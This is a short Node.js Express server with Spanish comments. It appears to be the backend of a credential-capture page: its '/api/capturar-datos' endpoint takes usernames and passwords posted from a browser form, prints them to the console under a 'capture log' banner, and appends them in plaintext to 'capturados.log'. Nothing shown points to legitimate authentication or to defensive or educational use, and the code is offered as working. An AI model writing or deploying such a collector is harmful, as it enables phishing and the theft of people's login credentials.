const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const port = 3000;

// Middleware esencial para interpretar los datos JSON que vienen del navegador
app.use(bodyParser.json());

// --- PUNTO DE ENTRADA DE LA CAPTURA (El reemplazo de tu lógica Python) ---
app.post('/api/capturar-datos', (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ message: "Faltan datos para la captura." });
    }

    console.log(`====================================================`);
    console.log(`[LOG DE CAPTURA] Recibido: ${username} / ${password}`);
    console.log(`====================================================`);

    // Lógica de persistencia: Guardar en un archivo de texto
    const timestamp = new Date().toISOString();
    const logEntry = `[${timestamp}] USUARIO: ${username} | PASSWORD: ${password}\n`;

    fs.appendFile('capturados.log', logEntry, (err) => {
        if (err) {
            console.error("FATAL ERROR: No se pudo escribir en el archivo.", err);
            return res.status(500).json({ message: "Fallo interno del sistema al guardar los datos." });
        }
        // Éxito: Devolver un mensaje de vuelta al navegador
        res.status(200).json({ success: true, message: "Datos procesados y guardados exitosamente." });
    });
});

app.listen(port, () => {
    console.log(`✅ Servidor Backend corriendo en http://localhost:${port}`);
    console.log('Abre index.html en tu navegador para probar.');
});